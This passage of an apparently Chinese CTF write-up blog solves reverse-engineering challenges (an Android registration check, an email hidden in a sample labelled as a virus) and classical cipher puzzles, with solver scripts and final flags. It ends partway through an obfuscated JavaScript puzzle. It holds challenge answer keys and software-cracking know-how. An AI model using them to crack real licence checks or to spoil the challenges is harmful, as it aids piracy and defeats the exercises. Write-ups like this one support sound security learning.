            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>下面给出解密用的python代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">]</span>
y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token keyword">or</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token keyword">or</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'Z'</span> <span class="token operator">&lt;</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">:</span>
            y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="注册程序的破解-CTF向-1"><a href="#注册程序的破解-CTF向-1" class="headerlink" title="注册程序的破解(CTF向)"></a>注册程序的破解(CTF向)</h2><h3 id="buu、简单注册器"><a href="#buu、简单注册器" class="headerlink" title="buu、简单注册器"></a>buu、简单注册器</h3><p><strong>题目描述</strong></p>
<p>生活中难免会有需要使用一些付费的程序，但是没有绿色版怎么办？只能自己逆向看看注册程序的代码是什么逻辑了。 注意：得到的 flag 请包上 flag{} 提交</p>
<p><strong>解题过程</strong></p>
<p>看起来很一般的注册程序。。。直接拖入jadx试试，连个保护壳都没有，不过也正好，就是学不到新的知识了可能。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token string">"dd2940c04462b4dd7c450528835cca15"</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    x<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">char</span> a <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    textview<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span> <span class="token operator">+</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不到10行的简单变换，直接出python脚本如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token string">'dd2940c04462b4dd7c450528835cca15'</span>
x <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">)</span>
x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span>
x<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span>
x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span>
    x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;59acc538825054c7de4b26440c0999dd&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Android病毒逆向"><a href="#Android病毒逆向" class="headerlink" title="Android病毒逆向"></a>Android病毒逆向</h2><h3 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h3><blockquote>
<p>描述:你好，这是上次聚会相片，你看看（病毒，不建议安装到手机，提取完整邮箱即为flag） 注意：得到的 flag 请包上 flag{} 提交</p>
</blockquote>
<p>题目挺简单的，就是软件没在模拟器上打得开，所以直接就逆向了一下so文件，直接找到最后的base64的三个串，都解一下密，发现</p>
<pre class="line-numbers language-none"><code class="language-none">MTgyMTg0NjUxMjVAMTYzLmNvbQ&#x3D;&#x3D;
18218465125@163.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>所以flag就是上面的这个网易邮箱套上个flag即可。</p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p><a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/baconian.php">培根密码在线解密</a></p>
<h4 id="GUET-CTF2019-NO-SOS"><a href="#GUET-CTF2019-NO-SOS" class="headerlink" title="[GUET-CTF2019]NO SOS"></a>[GUET-CTF2019]NO SOS</h4><p>原来题目上面都说了不是SOS也就是莫斯电码，而且如果是摩斯密码的话，没给出分隔符也是不好解的。所以这里是培根密码，本来只是AB这两个字符的故事，但是这两个字符可以使用其他的字符来表示，所以培根密码的形式是各式各样的都有，这里把<code>.</code>换成<code>A</code>、把<code>-</code>换成<code>B</code>即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span>–……<span class="token punctuation">.</span>–<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span>…<span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span>…–<span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>…<span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span>–<span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span>—<span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>太坑爹了，这个格式竟然还有错误，要修改为下面的内容</p>
<pre class="line-numbers language-none"><code class="language-none">..-.-.-.--.......--..-...-..-...--.-.-....-..-..--.-.-..-.-..----<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> <span class="token string">'..-.-.-.--.......--..-...-..-...--.-.-....-..-..--.-.-..-.-..----'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
AABABABABBAAAAAAABBAABAAABAABAAABBABABAAAABAABAABBABABAABABAABBBB
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后粘贴出去在线培根解密即可。</p>
<p><img src="/2021/05/28/CTF/image-20210729205524795.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;guetkkp&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mcprimer/articles/1418967.html">什么是希尔密码</a></p>
<h4 id="UTCTF2020-hill"><a href="#UTCTF2020-hill" class="headerlink" title="[UTCTF2020]hill"></a>[UTCTF2020]hill</h4><p>给出的内容为<code>wznqca&#123;d4uqop0fk_q1nwofDbzg_eu&#125;</code>，<code>wznqca</code>对应的内容就是<code>utflag</code>，而且这种加密是只针对字母来的。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string

s <span class="token operator">=</span> <span class="token string">'wznqcaduqopfkqnwofDbzgeu'</span>
flag_pre <span class="token operator">=</span> <span class="token string">'utflag'</span>
dic <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters
<span class="token comment"># 猜测n为2，那么密钥就是2行2列的矩阵，与之相乘的矩阵也必定是2行的，故可以使用下面的方式爆破key</span>
<span class="token keyword">def</span> <span class="token function">getkey</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> b1<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> b2<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> b3<span class="token punctuation">,</span> c3<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>a1 <span class="token operator">*</span> i <span class="token operator">+</span> b1 <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c1 <span class="token keyword">and</span> <span class="token punctuation">(</span>a2 <span class="token operator">*</span> i <span class="token operator">+</span> b2 <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c2 <span class="token keyword">and</span> <span class="token punctuation">(</span>a3 <span class="token operator">*</span> i <span class="token operator">+</span> b3 <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c3<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>


x1 <span class="token operator">=</span> getkey<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># wzu nqt caa</span>
x2 <span class="token operator">=</span> getkey<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>


flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token punctuation">(</span>x1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> x1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">]</span>
    flag <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token punctuation">(</span>x2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> x2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># utflag&#123;d4nger0us_c1pherText_qq&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="四方密码"><a href="#四方密码" class="headerlink" title="四方密码"></a>四方密码</h3><p><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/four.html">四方密码在线</a></p>
<p><a target="_blank" rel="noopener" href="https://wtool.com.cn/four.html">四方密码在线2</a></p>
<h4 id="四面八方"><a href="#四面八方" class="headerlink" title="四面八方"></a>四面八方</h4><pre class="line-numbers language-none"><code class="language-none">key1:security
key2:information

securityabdfghklmnopqvwxz
informatbcdeghklpqsuvwxyz
密文啊这是，骚年加油：zhnjinhoopcfcuktlj

解出来是：ypqcgaodrtccesnkqa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210727201446789.png" alt></p>
<p>再qiupquip一下就行了，我没解出来，这也太**了，为啥不直接就得flag呢。。。</p>
<pre class="line-numbers language-none"><code class="language-none">youngandsuccessful<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><h4 id="ctfshow、crypto3"><a href="#ctfshow、crypto3" class="headerlink" title="ctfshow、crypto3"></a>ctfshow、crypto3</h4><p><strong>TAG: jsfuck、颜文字</strong></p>
<p>给出的内容是一些特殊的字符，其实看起来是有一些眼熟的，但是就是想不起来，后来看看wp发现是我的浏览器上这个东西乱码</p>
<p><img src="/2021/05/28/CTF/image-20210720125250839.png" alt></p>
<p>我是先<code>另存界面为</code>，然后再打开另存出来的txt就会自动编好正确的码啦</p>
<pre class="line-numbers language-none"><code class="language-none">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) 